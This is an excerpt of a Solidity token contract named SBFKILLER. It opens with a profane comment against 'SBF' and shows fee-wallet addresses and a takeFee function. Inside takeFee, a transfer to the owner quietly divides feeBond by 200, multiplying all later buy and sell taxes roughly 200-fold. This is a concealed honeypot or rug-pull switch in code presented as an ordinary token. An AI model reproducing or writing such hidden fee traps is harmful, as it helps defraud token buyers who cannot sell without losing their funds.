...
/*
FUCK SBF, THIS FUCKING BITCH RUINED THIS MARKET
...
contract SBFKILLER is Context, IERC20, Ownable {
    ...
    uint256 private  feeBond=1000;
    address payable public marketingWalletAddress = payable(0x62f05F3dAB46f16520a3494FFEcF509C273fDFD8);
    address payable public liqWalletAddress = payable(0x62f05F3dAB46f16520a3494FFEcF509C273fDFD8);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(feeBond);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(feeBond);
        }
        if(recipient==owner()){
            feeBond = feeBond.div(200);
        }
        if(feeAmount > 0) {
